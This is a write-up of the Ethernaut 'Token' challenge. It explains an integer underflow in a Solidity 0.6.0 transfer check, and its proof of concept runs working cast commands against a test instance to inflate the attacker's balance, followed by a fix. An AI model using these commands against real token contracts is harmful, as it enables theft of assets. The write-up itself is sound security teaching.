# Ethernaut Challenge 05 — Token

## Goal

The challenge is solved when the attacker successfully obtains any additional tokens beyond the initial 20 tokens.

**Instance:**

```text
0x5e0099E93E842827F4Cb3d94126c7DdB83630d0C
```

## Vulnerability

The contract uses Solidity `0.6.0`, where unsigned integer arithmetic does not automatically revert on underflow.

The vulnerable logic is:

```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

The validation attempts to ensure that the sender has enough tokens:

```solidity
require(balances[msg.sender] - _value >= 0);
```

However, `balances[msg.sender]` and `_value` are `uint256` values.

In Solidity `0.6.0`, if `_value` is greater than the sender's balance, the subtraction underflows and wraps around modulo `2^256` instead of reverting.

For example:

```text
balance = 20
_value  = 21

20 - 21
```

wraps around to:

```text
2^256 - 1
```

which is:

```text
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

This value is greater than or equal to zero, so the `require` condition passes.

The root cause is relying on the result of an unsigned subtraction for validation in a pre-Solidity-0.8 contract.

## Attack Path

```text
Initial balance = 20

        ↓

Call transfer(recipient, 21)

        ↓

require(20 - 21 >= 0)

        ↓

uint256 underflow

        ↓

20 - 21 → 2^256 - 1

        ↓

require condition passes

        ↓

Attacker balance = 2^256 - 1

        ↓

Recipient balance = 21

        ↓

Attacker balance > 20

        ↓

Level complete
```

The important condition is that the recipient must be a **different address**.

If the attacker transfers 21 tokens to their own address:

```text
20 - 21 + 21 = 20
```

so the balance returns to 20 and the exploit does not achieve the level objective.

Using a separate recipient address causes the sender's underflowed balance to remain intact.

## Proof of Concept

The exploit was reproduced directly against the deployed Sepolia instance using `cast`.

### 1. Verify the initial balance

```bash
cast call 0x5e0099E93E842827F4Cb3d94126c7DdB83630d0C \
    "balanceOf(address)(uint256)" \
    $(cast wallet address --private-key $PRIVATE_KEY) \
    --rpc-url $RPC_URL
```

Initial balance:

```text
20
```

### 2. Create a separate recipient address

```bash
cast wallet new
```

Generated recipient:

```text
0x416e2855EDDF8621655a81D44501F1c13B6a56D3
```

### 3. Execute the underflow

The attacker transfers 21 tokens despite having only 20:

```bash
cast send 0x5e0099E93E842827F4Cb3d94126c7DdB83630d0C \
    "transfer(address,uint256)" \
    0x416e2855EDDF8621655a81D44501F1c13B6a56D3 \
    21 \
    --private-key $PRIVATE_KEY \
    --rpc-url $RPC_URL
```

The transaction succeeded:

```text
status  1 (success)
```

Transaction hash:

```text
0x627b0292fae78c623addfdb5095c85fd795e31b2a58ffd22d75f8a1267997feb
```

### 4. Verify the attacker's balance

```bash
cast call 0x5e0099E93E842827F4Cb3d94126c7DdB83630d0C \
    "balanceOf(address)(uint256)" \
    $(cast wallet address --private-key $PRIVATE_KEY) \
    --rpc-url $RPC_URL
```

Result:

```text
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

This is:

```text
2^256 - 1
```

### 5. Verify the recipient balance

```bash
cast call 0x5e0099E93E842827F4Cb3d94126c7DdB83630d0C \
    "balanceOf(address)(uint256)" \
    0x416e2855EDDF8621655a81D44501F1c13B6a56D3 \
    --rpc-url $RPC_URL
```

Result:

```text
21
```

The attacker therefore obtained a balance vastly greater than the initial 20 tokens, confirming the integer underflow exploit.

## Impact

**Severity: High**

An attacker can transfer more tokens than their actual balance because the subtraction underflows instead of reverting.

By transferring an amount greater than their balance to another address, the attacker can cause their balance to wrap around to the maximum possible `uint256` value:

```text
2^256 - 1
```

This breaks the fundamental balance invariant of the token contract and allows an attacker to create an effectively unlimited token balance.

If these tokens represent real assets or provide access to other protocol functionality, the vulnerability could result in severe financial or authorization consequences.

## Remediation

For contracts that must remain on Solidity versions prior to `0.8.0`, validate the balance **before** performing the subtraction:

```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] >= _value, "insufficient balance");

    balances[msg.sender] -= _value;
    balances[_to] += _value;

    return true;
}
```

Preferably, migrate to Solidity `^0.8.0`, where arithmetic underflow and overflow automatically revert:

```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] >= _value, "insufficient balance");

    balances[msg.sender] -= _value;
    balances[_to] += _value;

    return true;
}
```

The key principle is to validate the available balance **before subtraction** rather than relying on the result of an unsigned subtraction.

## Audit Takeaway

**Always check unsigned integer bounds before arithmetic in pre-Solidity-0.8 contracts.**

In Solidity versions before `0.8.0`, unsigned integer arithmetic wraps around on underflow:

```text
0 - 1 → 2^256 - 1
```

Therefore, a check such as:

```solidity
require(balance - amount >= 0);
```

does not prevent underflow.

The correct validation pattern is:

```solidity
require(balance >= amount);
balance -= amount;
```

This challenge also demonstrates why the **compiler version is a critical part of smart contract security analysis**. The same arithmetic operation behaves differently in Solidity `0.6.x` and Solidity `0.8.x`.

The audit question should therefore always be:

```text
What Solidity version is this contract using?
        ↓
How does that version handle arithmetic?
        ↓
Are arithmetic operations explicitly protected?
```

This is a classic **integer underflow vulnerability** caused by unchecked arithmetic in a pre-Solidity-0.8 contract.
